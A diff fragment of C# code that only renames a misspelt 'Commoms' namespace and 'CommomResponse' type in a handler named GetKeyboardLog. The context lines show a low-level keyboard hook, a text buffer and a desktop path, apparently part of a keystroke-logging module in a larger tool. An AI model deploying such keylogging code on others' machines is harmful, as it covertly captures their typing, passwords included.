@@ -1,4 +1,4 @@
-﻿using Barsa.Commoms;
+﻿using Barsa.Commons;
 using MediatR;
 using System;
 using System.Diagnostics;
@@ -12,7 +12,7 @@ using System.Windows.Forms;
 
 namespace Caronte.Modules.Information.GetKeyboardLog
 {
-    public class GetKeyboardLogQueryHandler : IRequestHandler<GetKeyboardLogQuery, CommomResponse>
+    public class GetKeyboardLogQueryHandler : IRequestHandler<GetKeyboardLogQuery, CommonResponse>
     {
         private StringBuilder buffer;
         private readonly string desktopPath;
@@ -49,7 +49,7 @@ namespace Caronte.Modules.Information.GetKeyboardLog
             buffer = new StringBuilder();
         }
 
-        public Task<CommomResponse> Handle(GetKeyboardLogQuery request, CancellationToken cancellationToken)
+        public Task<CommonResponse> Handle(GetKeyboardLogQuery request, CancellationToken cancellationToken)
         {
             _proc = HookCallback;
             hookId = SetHook(_proc);
@@ -62,7 +62,7 @@ namespace Caronte.Modules.Information.GetKeyboardLog
 
             inactivityTimer.Stop();
 
-            return Task.FromResult(new CommomResponse());
+            return Task.FromResult(new CommonResponse());
         }
 
         private IntPtr SetHook(LowLevelKeyboardProc proc)
